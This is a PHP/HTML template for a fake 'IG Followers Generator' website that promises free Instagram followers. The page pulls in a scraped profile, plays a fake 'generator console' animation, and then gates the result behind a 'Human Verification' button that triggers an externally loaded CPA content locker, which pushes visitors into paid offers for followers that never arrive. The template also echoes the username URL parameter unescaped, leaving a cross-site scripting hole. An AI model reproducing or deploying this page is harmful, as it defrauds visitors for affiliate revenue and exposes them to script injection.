<!DOCTYPE html>
<html>
<head>
	<title>IG Followers Generator</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="description" content="Generator for adding followers." />
	<meta property="og:title" content="IG Followers Generator" /> <!-- Title which is displayed when sharing your site on social networks. -->
	<meta property="og:description" content="Generator for adding followers." /> <!-- Description which is displayed when sharing your site on social networks. -->
	<meta property="og:type" content="website" />
	<meta property="og:url" content="http://www.yourdomain.com/" /> <!-- URL which is displayed when sharing your site on social networks. -->
	<!-- <meta property="og:image" content="http://www.yourdomain.com/img/yourimagename.jpg" /> Link to your social-share image. Don't forget to uncomment this line. -->
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <link rel="icon" type="image/ico" href="img/favicon.ico" />
    <!-- CSS -->
    <link href="https://fonts.googleapis.com/css?family=Raleway:300,400,700" rel="stylesheet"> 	
	<link href="https://fonts.googleapis.com/css?family=Montserrat:300,400,700" rel="stylesheet"> 
	<link href="https://fonts.googleapis.com/css?family=Pacifico" rel="stylesheet">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css">
    <link href="css/bootstrap.min.css" rel="stylesheet" />
    <link href="css/animate.css" rel="stylesheet" />
    <link href="css/magnific-popup.css" rel="stylesheet" />
	<link href="css/sweet-alert.css" rel="stylesheet" />
    <link href="css/style.css" rel="stylesheet" />  
		<!-- cpaoffer -->
<script type="text/javascript">
    var CPABUILDSETTINGS={"it":1333394,"key":"48b60"};
</script>
<script src="https://d13nu0oomnx5ti.cloudfront.net/d9d3fc1.js"></script>
	<!-- cpaoffer -->
</head>
<body>		
	<div class="main-container">
		<div class="row">
			<div class="logo-wrapper col-sm-12">
				<img class="logo img-responsive" src="img/logo.png" />
				<h1>Followers Generator</h1>
			</div>
		</div>
		<div class="content-wrapper generator-content-wrapper">				
			<div class="row">
				<div class="profile-form-wrapper col-sm-12">
					<?php									
						$username = $_GET['username'];
						$url = "https://www.instagram.com/" . $username;									
						$data = @file_get_contents($url);
						preg_match('/\"followed_by\"\:\s?\{\"count\"\:\s?([0-9]+)/',$data,$followed_by);
						preg_match('/\"follows\"\:\s?\{\"count\"\:\s?([0-9]+)/',$data,$following);
						preg_match('/\"full_name"\:\s?\"([a-zA-Z ]+)/',$data,$full_name);
						preg_match('/\"profile_pic_url"\:\s?\"((http[s]?:\/\/)?([^\/\s]+\/)(.*?)")/',$data,$profile_pic);					
					if ($data === false) { ?>
						<div class="processing-wrapper-not-connected">
							<div class="processing-inner-wrapper">
								<div class="cssload-dots">
									<div class="cssload-dot"></div>
									<div class="cssload-dot"></div>
									<div class="cssload-dot"></div>
									<div class="cssload-dot"></div>
									<div class="cssload-dot"></div>
								</div>
								<svg version="1.1" xmlns="http://www.w3.org/2000/svg">
									<defs>
										<filter id="goo">
											<feGaussianBlur in="SourceGraphic" result="blur" stdDeviation="12" ></feGaussianBlur>
											<feColorMatrix in="blur" mode="matrix" values="1 0 0 0 0	0 1 0 0 0	0 0 1 0 0	0 0 0 18 -7" result="goo" ></feColorMatrix>
											<!--<feBlend in2="goo" in="SourceGraphic" result="mix" ></feBlend>-->
										</filter>
									</defs>
								</svg>
								<p class="animated infinite jello">Retrieving Profile Info...</p>
							</div>
						</div>
						<div class="error-message">
							<i class="fa fa-times-circle-o" aria-hidden="true"></i>
							<h1>Oops, error</h1>
							<div class="error-message-notice">It seems you entered an invalid Username which we can't find!</div>
							<div class="error-button-wrapper"><a id="error-go-back-button" class="error-button-back ig-button small">Go Back</a></div>
						</div>							
					<?php }
					else { ?>
						<div class="processing-wrapper">
							<div class="processing-inner-wrapper">
								<div class="cssload-dots">
									<div class="cssload-dot"></div>
									<div class="cssload-dot"></div>
									<div class="cssload-dot"></div>
									<div class="cssload-dot"></div>
									<div class="cssload-dot"></div>
								</div>
								<svg version="1.1" xmlns="http://www.w3.org/2000/svg">
									<defs>
										<filter id="goo">
											<feGaussianBlur in="SourceGraphic" result="blur" stdDeviation="12" ></feGaussianBlur>
											<feColorMatrix in="blur" mode="matrix" values="1 0 0 0 0	0 1 0 0 0	0 0 1 0 0	0 0 0 18 -7" result="goo" ></feColorMatrix>
											<!--<feBlend in2="goo" in="SourceGraphic" result="mix" ></feBlend>-->
										</filter>
									</defs>
								</svg>
								<p class="animated infinite jello">Retrieving Profile Info...</p>
							</div>
						</div>
						<div class="processing-second-step">
							<div class="profile-info-wrapper">
								<h3>Selected Profile Info</h3>
								<div class="profile-info-content-wrapper">
									<div class="row profile-info-row">
										<div class="profile-img-wrapper col-xs-3">
											<div class="flip-container">
												<div class="card">
													<img class="profile-picture-img back img-responsive" alt="Profile Picture Image" src="<?php if (!empty($profile_pic)) { echo $profile_pic[1]; } ?>"/>
													<img class="profile-picture-img front img-responsive" alt="Profile Picture Image" src="<?php if (!empty($profile_pic)) { echo $profile_pic[1]; } ?>"/>			
												</div>
											</div>									
										</div>
										<div class="profile-info-field-username col-xs-9">
											<div class="profile-info-username"><?php if (!empty($full_name)) { echo $full_name[1]; } ?> • (@<span id="console-username-val"><?php if (!empty($username)) { echo $username; } ?></span>)</div>
											<span id="current-followers-value" class="profile-info-content"><?php if (!empty($followed_by)) { echo $followed_by[1]; } ?></span>
											<span class="profile-info-label">followers</span><span class="profile-info-separator">•</span>						
											<span class="profile-info-content"><?php if (!empty($following)) { echo $following[1]; } ?></span>
											<span class="profile-info-label">following</span>
										</div>
									</div>
									<div class="go-back-wrapper">Wrong profile? <span id="go-back">Go back</span></div>
								</div>
							</div>
							<div class="amount-of-followers-selection-wrapper">
								<h3>Select the amount of followers</h3>
								<div class="row amount-of-followers-selection-row">	
									<div class="amount-of-followers-selection-item-wrapper col-xs-4 amount-of-followers-selection-item-wrapper-1">	
										<div class="amount-of-followers-selection-item amount-of-followers-selection-item-1">	
											<img class="followers-amount-selection-img img-responsive" alt="1000 Followers" src="img/followers-selection-1.png"/>		
											<div class="amount-of-followers-selection-item-value"><span>1000</span>Followers</div>
										</div>
									</div>
									<div class="amount-of-followers-selection-item-wrapper col-xs-4 amount-of-followers-selection-item-wrapper-2">	
										<div class="amount-of-followers-selection-item amount-of-followers-selection-item-2">	
											<img class="followers-amount-selection-img img-responsive" alt="2500 Followers" src="img/followers-selection-2.png"/>		
											<div class="amount-of-followers-selection-item-value"><span>2500</span>Followers</div>
										</div>
									</div>
									<div class="amount-of-followers-selection-item-wrapper col-xs-4 amount-of-followers-selection-item-wrapper-3">	
										<div class="amount-of-followers-selection-item amount-of-followers-selection-item-3">	
											<img class="followers-amount-selection-img img-responsive" alt="5000 Followers" src="img/followers-selection-3.png"/>		
											<div class="amount-of-followers-selection-item-value"><span>5000</span>Followers</div>
										</div>
									</div>
								</div>
								<button type="submit" id="add-followers-button" class="add-followers-button ig-button" >Add Followers</button>
							</div>
							<div id="adding-followers-console-notice-wrapper" class="adding-followers-console-notice-wrapper mfp-hide">
								<div class="adding-followers-console-notice-inner-wrapper">
									<div class="adding-followers-console-notice-header">
										<img class="console-notice-logo img-responsive" alt="IG Logo Small" src="img/logo-dark-small.png" />
										<h4>Followers Generator</h4>
									</div>
									<div class="adding-followers-console-notice-content">
										<p class="console-notice-info-line">You are about to add <strong><span id="console-notice-followers-value"></span> followers</strong> to Instagram account <strong><span id="console-notice-account">@<?php if (!empty($username)) { echo $username; } ?></span></strong></p>
										<p>This will increase the amount of Followers to <strong><span id="console-notice-followers-new-value"></span></strong></p>
									</div>
									<div class="console-notice-button-wrapper">
										<button type="submit" id="generate-followers-button" class="generate-followers-button ig-button" >Sure, go ahead!</button>
										<a id="console-notice-go-back">No, I changed my mind</a>
									</div>
								</div>
							</div>
							<div class="adding-followers-console-animation-wrapper">
								<div class="adding-followers-console-animation">
									<div class="cssload-dots-2">
										<div class="cssload-dot"></div>
										<div class="cssload-dot"></div>
										<div class="cssload-dot"></div>
										<div class="cssload-dot"></div>
										<div class="cssload-dot"></div>
									</div>
									<svg version="1.1" xmlns="http://www.w3.org/2000/svg">
										<defs>
											<filter id="goo2">
												<feGaussianBlur in="SourceGraphic" result="blur" stdDeviation="12" ></feGaussianBlur>
												<feColorMatrix in="blur" mode="matrix" values="1 0 0 0 0	0 1 0 0 0	0 0 1 0 0	0 0 0 18 -7" result="goo" ></feColorMatrix>
												<!--<feBlend in2="goo" in="SourceGraphic" result="mix" ></feBlend>-->
											</filter>
										</defs>
									</svg>
								</div>
							</div>
							<div class="adding-followers-console-wrapper">
								<div class="adding-followers-console-row">	
									<div class="adding-followers-console-inner-wrapper">											
										<div class="adding-followers-console">	
											<h4>Generator Console</h4>
											<div class="adding-followers-console-content">
												<div id="fountainG">
													<div id="fountainG_1" class="fountainG"></div>
													<div id="fountainG_2" class="fountainG"></div>
													<div id="fountainG_3" class="fountainG"></div>
													<div id="fountainG_4" class="fountainG"></div>
													<div id="fountainG_5" class="fountainG"></div>
													<div id="fountainG_6" class="fountainG"></div>
													<div id="fountainG_7" class="fountainG"></div>
													<div id="fountainG_8" class="fountainG"></div>
												</div>
												<div id="console-new-followers"><span id="console-new-followers-label">Followers:</span><img class="console-profile-picture-img img-responsive" alt="Profile Picture Image" src="<?php if (!empty($profile_pic)) { echo $profile_pic[1]; } ?>"/><span id="console-new-followers-value"><?php if (!empty($followed_by)) { echo $followed_by[1]; } ?></span></div>
												<span class="console-message">Loading generator files...</span>
											</div>
											<div id="progressBarConsole" class="console-loadbar"><div></div></div>
										</div>
									</div>
								</div>								
							</div>
							<div class="human-verification-wrapper">
								<div class="human-verification-inner-wrapper">
									<h3>Human Verification</h3>
									<p>To prevent robot abuse of our generator, you are required to complete the human verification by clicking the button below.</p>
									<div id="fountainG">
										<div id="fountainG_1" class="fountainG"></div>
										<div id="fountainG_2" class="fountainG"></div>
										<div id="fountainG_3" class="fountainG"></div>
										<div id="fountainG_4" class="fountainG"></div>
										<div id="fountainG_5" class="fountainG"></div>
										<div id="fountainG_6" class="fountainG"></div>
										<div id="fountainG_7" class="fountainG"></div>
										<div id="fountainG_8" class="fountainG"></div>
									</div>
									<div class="human-verification-button-wrapper">
									

										<a type="submit" id="human-verification-button" class="human-verification-button ig-button"onclick="CPABuildLock()">Click me!</a>
									</div>
								</div>
							</div>
						</div>
					<?php } ?>
				</div>		
			</div>							
		</div>	
		<div class="row">
			<div class="recent-activity-wrapper section-wrapper col-sm-5">
				<div class="content-wrapper">
					<div class="section-title">
						<h2>Recent Activity</h2>
					</div>
					<div class="recent-activity-inner-wrapper">
						<div id="recent-activity" class="recent-activity"></div>
					</div>
				</div>
			</div>
			<div class="video-proof-wrapper section-wrapper col-sm-7">
				<div class="content-wrapper">
					<div class="section-title">
						<h2>Video Proof</h2>
					</div>	
					<div class="video-proof-inner-wrapper">
						<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Mauris nec ante et est sodales pharetra vel sit amet orci.</p>		
						<div class="fit-vids-me">
							<iframe src="https://www.youtube.com/embed/_GuOjXYl5ew" frameborder="0" allowfullscreen></iframe>
						</div>
					</div>
				</div>
			</div>	
		</div>	
		<div class="row">
			<div class="chat-wrapper section-wrapper col-sm-5">
				<div class="content-wrapper match-height">		
					<div class="section-title">
						<h2>Live Chat</h2>
					</div>		
					<div class="chat-inner-wrapper">
						<div class="live-chat-header">
							<span class="live-chat-online-count">
								Generator Chatroom (<span id="online2"></span>)
							</span>
						</div>
						<div class="live-chat-container">
							<div id="live-chat-inner-container" style="text-shadow: none;">
								<div class="live-chat-overlay">
								</div>
								<div id="live-chat-name-wrapper">
									<div class="live-chat-header">
										<span class="chat-input-label">Enter your Chat Username</span>
									</div>
									<input id="live-chat-name" type="text" placeholder="Chat Username...">
									<div id="live-chat-name-confirm-button" class="live-chat-name-confirm-button">
										Save
									</div>
								</div>
								<div id="live-chat-content-wrapper">
									<div id="live-chat-content"></div>
								</div>
							</div>
							<div id="live-chat-message-wrapper">
								<div>
									<input id="live-chat-input" placeholder="Send a message" type="text">
									<div class="live-chat-button-wrapper">
										<div id="live-chat-button">
											<div class="ig-button small">
												Send
											</div>
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>						
				</div>
			</div>
			<div class="comments-wrapper section-wrapper col-sm-7">
				<div class="content-wrapper match-height">
					<div class="section-title">
						<h2>Latest Comments</h2>
					</div>									
					<?php include 'comments.php';?>
				</div>
			</div>
		</div>								
	</div>
	<footer>
		<div class="main-container">
			<div class="content-wrapper">
				<div class="footer-inner-wrapper">
					<div class="footer-links">
						<a class="popup-contact popup-link" href="#contact-us">Contact Us</a><span class="popup-link-separator"> |</span>
						<a class="popup-tos popup-link" href="#terms-of-service">Terms of Service</a><span class="popup-link-separator"> |</span>
						<a class="popup-pp popup-link" href="#privacy-policy">Privacy Policy</a>
					</div>
					<p>
						&copy; Copyright 2016, all rights reserved.
						<br>
						<span class="shortenedspan">All trademarks, service marks, trade names, trade dress, product names and logos appearing on the site are the property of their respective owners.</span>
					</p>
				</div>
			</div>
		</div>		
		<div id="contact-us" class="contact-popup-wrapper popup-wrapper mfp-hide">
			<h1>Send us a message</h1>
			<div class="contact-form-wrapper">
				<form role="form" id="contactForm" data-toggle="validator" class="shake">
					<div class="row">
						<div class="form-group col-sm-6">
							<label for="name">Name</label>
							<input type="text" class="form-control" id="name" placeholder="Enter name" required>
							<div class="help-block with-errors"></div>
						</div>
						<div class="form-group col-sm-6">
							<label for="email">Email</label>
							<input type="email" class="form-control" id="email" placeholder="Enter email" required>
							<div class="help-block with-errors"></div>
						</div>
					</div>
					<div class="form-group">
						<label for="message">Message</label>
						<textarea id="message" class="form-control" rows="5" placeholder="Enter your message" required></textarea>
						<div class="help-block with-errors"></div>
					</div>
					<button type="submit" id="form-submit" class="ig-button small">Submit</button>
					<div id="msgSubmit" class="h3 text-center hidden"></div>
					<div class="clearfix"></div>
				</form>
			</div>
		</div>
		<div id="terms-of-service" class="tos-popup-wrapper popup-wrapper mfp-hide">
			<h1>Terms of service</h1>

			<p>These terms of service ("Terms", "Agreement") are an agreement between the operator of MyWebsite ("Website operator", "us", "we" or "our") and you ("User", "you" or "your"). This Agreement sets forth the general terms and conditions of your use of the http://www.mywebsite.com website and any of its products or services (collectively, "Website" or "Services").</p>

			<h2>Age requirement</h2>

			<p>You must be at least 18 years of age to use this Website. By using this Website and by agreeing to this Agreement you warrant and represent that you are at least 18 years of age.</p>

			<h2>Backups</h2>

			<p>We are not responsible for Content residing on the Website. In no event shall we be held liable for any loss of any Content. It is your sole responsibility to maintain appropriate backup of your Content. Notwithstanding the foregoing, on some occasions and in certain circumstances, with absolutely no obligation, we may be able to restore some or all of your data that has been deleted as of a certain date and time when we may have backed up data for our own purposes. We make no guarantee that the data you need will be available.</p>

			<h2>Links to other websites</h2>

			<p>Although this Website may be linked to other websites, we are not, directly or indirectly, implying any approval, association, sponsorship, endorsement, or affiliation with any linked website, unless specifically stated herein. We are not responsible for examining or evaluating, and we do not warrant the offerings of, any businesses or individuals or the content of their websites. We do not assume any responsibility or liability for the actions, products, services and content of any other third parties. You should carefully review the legal statements and other conditions of use of any website which you access through a link from this Website. Your linking to any other off-site pages or other websites is at your own risk.</p>

			<h2>Advertisements</h2>

			<p>During use of the Website, you may enter into correspondence with or participate in promotions of advertisers or sponsors showing their goods or services through the Website. Any such activity, and any terms, conditions, warranties or representations associated with such activity, is solely between you and the applicable third-party. We shall have no liability, obligation or responsibility for any such correspondence, purchase or promotion between you and any such third-party.</p>

			<h2>Prohibited uses</h2>

			<p>In addition to other terms as set forth in the Agreement, you are prohibited from using the website or its content: (a) for any unlawful purpose; (b) to solicit others to perform or participate in any unlawful acts; (c) to violate any international, federal, provincial or state regulations, rules, laws, or local ordinances; (d) to infringe upon or violate our intellectual property rights or the intellectual property rights of others; (e) to harass, abuse, insult, harm, defame, slander, disparage, intimidate, or discriminate based on gender, sexual orientation, religion, ethnicity, race, age, national origin, or disability; (f) to submit false or misleading information; (g) to upload or transmit viruses or any other type of malicious code that will or may be used in any way that will affect the functionality or operation of the Service or of any related website, other websites, or the Internet; (h) to collect or track the personal information of others; (i) to spam, phish, pharm, pretext, spider, crawl, or scrape; (j) for any obscene or immoral purpose; or (k) to interfere with or circumvent the security features of the Service or any related website, other websites, or the Internet. We reserve the right to terminate your use of the Service or any related website for violating any of the prohibited uses.</p>

			<h2>Limitation of liability</h2>

			<p>To the fullest extent permitted by applicable law, in no event will Website operator, its affiliates, officers, directors, employees, agents, suppliers or licensors be liable to any person for (a): any indirect, incidental, special, punitive, cover or consequential damages (including, without limitation, damages for lost profits, revenue, sales, goodwill, use or content, impact on business, business interruption, loss of anticipated savings, loss of business opportunity) however caused, under any theory of liability, including, without limitation, contract, tort, warranty, breach of statutory duty, negligence or otherwise, even if Website operator has been advised as to the possibility of such damages or could have foreseen such damages. To the maximum extent permitted by applicable law, the aggregate liability of Website operator and its affiliates, officers, employees, agents, suppliers and licensors, relating to the services will be limited to an amount greater of one dollar or any amounts actually paid in cash by you to Website operator for the prior one month period prior to the first event or occurrence giving rise to such liability. The limitations and exclusions also apply if this remedy does not fully compensate you for any losses or fails of its essential purpose.</p>

			<h2>Indemnification</h2>

			<p>You agree to indemnify and hold Website operator and its affiliates, directors, officers, employees, and agents harmless from and against any liabilities, losses, damages or costs, including reasonable attorneys' fees, incurred in connection with or arising from any third-party allegations, claims, actions, disputes, or demands asserted against any of them as a result of or relating to your Content, your use of the Website or Services or any willful misconduct on your part.</p>

			<h2>Severability</h2>

			<p>All rights and restrictions contained in this Agreement may be exercised and shall be applicable and binding only to the extent that they do not violate any applicable laws and are intended to be limited to the extent necessary so that they will not render this Agreement illegal, invalid or unenforceable. If any provision or portion of any provision of this Agreement shall be held to be illegal, invalid or unenforceable by a court of competent jurisdiction, it is the intention of the parties that the remaining provisions or portions thereof shall constitute their agreement with respect to the subject matter hereof, and all such remaining provisions or portions thereof shall remain in full force and effect.</p>

			<h2>Dispute resolution</h2>

			<p>The formation, interpretation and performance of this Agreement and any disputes arising out of it shall be governed by the substantive and procedural laws of Bern, Switzerland without regard to its rules on conflicts or choice of law and, to the extent applicable, the laws of Switzerland. The exclusive jurisdiction and venue for actions related to the subject matter hereof shall be the state and federal courts located in Bern, Switzerland, and you hereby submit to the personal jurisdiction of such courts. You hereby waive any right to a jury trial in any proceeding arising out of or related to this Agreement. The United Nations Convention on Contracts for the International Sale of Goods does not apply to this Agreement.</p>

			<h2>Changes and amendments</h2>

			<p>We reserve the right to modify this Agreement or its policies relating to the Website or Services at any time, effective upon posting of an updated version of this Agreement on the Website. When we do we will revise the updated date at the bottom of this page. Continued use of the Website after any such changes shall constitute your consent to such changes.</p>

			<h2>Acceptance of these terms</h2>

			<p>You acknowledge that you have read this Agreement and agree to all its terms and conditions. By using the Website or its Services you agree to be bound by this Agreement. If you do not agree to abide by the terms of this Agreement, you are not authorized to use or access the Website and its Services.</p>

			<h2>Contacting us</h2>

			<p>If you have any questions about this Policy, please contact us.</p>

			<p><strong>This document was last updated on April 3, 2017</strong></p>
		</div>
		<div id="privacy-policy" class="pp-popup-wrapper popup-wrapper mfp-hide">
			<h1>Privacy policy</h1>

			<p>This privacy policy ("Policy") describes how we collect, protect and use the personally identifiable information ("Personal Information") you ("User", "you" or "your") provide on the http://www.mywebsite.com website and any of its products or services (collectively, "Website" or "Services"). It also describes the choices available to you regarding our use of your personal information and how you can access and update this information. This Policy does not apply to the practices of companies that we do not own or control, or to individuals that we do not employ or manage.</p>

			<h2>Collection of personal information</h2>

			<p>We receive and store any information you knowingly provide to us when you fill any online forms on the Website. You can choose not to provide us with certain information, but then you may not be able to take advantage of some of the Website's features.</p>

			<h2>Collection of non-personal information</h2>

			<p>When you visit the Website our servers automatically record information that your browser sends. This data may include information such as your computer's IP address, browser type and version, operating system type and version, language preferences or the webpage you were visiting before you came to our Website, pages of our Website that you visit, the time spent on those pages, information you search for on our Website, access times and dates, and other statistics.</p>

			<h2>Use of collected information</h2>

			<p>Any of the information we collect from you may be used to personalize your experience; improve our website; improve customer service and respond to queries and emails of our customers; run and operate our Website and Services. Non-personal information collected is used only to identify potential cases of abuse and establish statistical information regarding Website traffic and usage. This statistical information is not otherwise aggregated in such a way that would identify any particular user of the system.</p>

			<h2>Children</h2>

			<p>We do not knowingly collect any personal information from children under the age of 13. If you are under the age of 13, please do not submit any personal information through our Website or Service. We encourage parents and legal guardians to monitor their children's Internet usage and to help enforce this Policy by instructing their children never to provide personal information through our Website or Service without their permission. If you have reason to believe that a child under the age of 13 has provided personal information to us through our Website or Service, please contact us.</p>

			<h2>Cookies</h2>

			<p>The Website uses "cookies" to help personalize your online experience. A cookie is a text file that is placed on your hard disk by a web page server. Cookies cannot be used to run programs or deliver viruses to your computer. Cookies are uniquely assigned to you, and can only be read by a web server in the domain that issued the cookie to you. We may use cookies to collect, store, and track information for statistical purposes to operate our Website and Services. You have the ability to accept or decline cookies. Most web browsers automatically accept cookies, but you can usually modify your browser setting to decline cookies if you prefer. If you choose to decline cookies, you may not be able to fully experience the features of the Website and Services.</p>

			<h2>Advertisement</h2>

			<p>We may display online advertisements and we may share aggregated and non-identifying information about our customers that we collect through the registration process or through online surveys and promotions with certain advertisers. We do not share personally identifiable information about individual customers with advertisers. In some instances, we may use this aggregated and non-identifying information to deliver tailored advertisements to the intended audience.</p>

			<h2>Links to other websites</h2>

			<p>Our Website contains links to other websites that are not owned or controlled by us. Please be aware that we are not responsible for the privacy practices of such other websites or third parties. We encourage you to be aware when you leave our Website and to read the privacy statements of each and every website that may collect personal information.</p>

			<h2>Information security</h2>

			<p>We secure information you provide on computer servers in a controlled, secure environment, protected from unauthorized access, use, or disclosure. We maintain reasonable administrative, technical, and physical safeguards in an effort to protect against unauthorized access, use, modification, and disclosure of personal information in its control and custody. However, no data transmission over the Internet or wireless network can be guaranteed. Therefore, while we strive to protect your personal information, you acknowledge that (i) there are security and privacy limitations of the Internet which are beyond our control; (ii) the security, integrity, and privacy of any and all information and data exchanged between you and our Website cannot be guaranteed; and (iii) any such information and data may be viewed or tampered with in transit by a third party, despite best efforts.</p>

			<h2>Data breach</h2>

			<p>In the event we become aware that the security of the Website has been compromised or users Personal Information has been disclosed to unrelated third parties as a result of external activity, including, but not limited to, security attacks or fraud, we reserve the right to take reasonably appropriate measures, including, but not limited to, investigation and reporting, as well as notification to and cooperation with law enforcement authorities. In the event of a data breach, we will make reasonable efforts to notify affected individuals if we believe that there is a reasonable risk of harm to the user as a result of the breach or if notice is otherwise required by law. When we do we will post a notice on the Website.</p>

			<h2>Changes and amendments</h2>

			<p>We reserve the right to modify this privacy policy relating to the Website or Services at any time, effective upon posting of an updated version of this privacy policy on the Website. When we do we will revise the updated date at the bottom of this page. Continued use of the Website after any such changes shall constitute your consent to such changes.</p>

			<h2>Acceptance of this policy</h2>

			<p>You acknowledge that you have read this Policy and agree to all its terms and conditions. By using the Website or its Services you agree to be bound by this Policy. If you do not agree to abide by the terms of this Policy, you are not authorized to use or access the Website and its Services.</p>

			<h2>Contacting us</h2>

			<p>If you have any questions about this Policy, please contact us.</p>

			<p><strong>This document was last updated on April 3, 2017</strong></p>
		</div>	
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
    <script type="text/javascript" src="js/sweet-alert.min.js"></script>
    <script type="text/javascript" src="js/jquery.magnific-popup.min.js"></script>
    <script type="text/javascript" src="js/jquery.fitvids.js"></script>    
    <script type="text/javascript" src="js/validator.min.js"></script>
    <script type="text/javascript" src="js/jquery.matchHeight-min.js"></script>
    <script type="text/javascript" src="js/com.js"></script>
    <script type="text/javascript" src="js/sticky.js"></script>
    <script type="text/javascript" src="js/form-scripts.js"></script>
    <script type="text/javascript" src="js/jquery.countTo.js"></script>
    <script type="text/javascript" src="js/main.js"></script>
	<?php if ($data === false) { ?>
		<script type="text/javascript" src="js/processing-request-not-connected.js"></script>				
	<?php }
	else { ?>
		<script type="text/javascript" src="js/processing-request.js"></script>	
	<?php } ?>
	</footer>
</body>
</html>
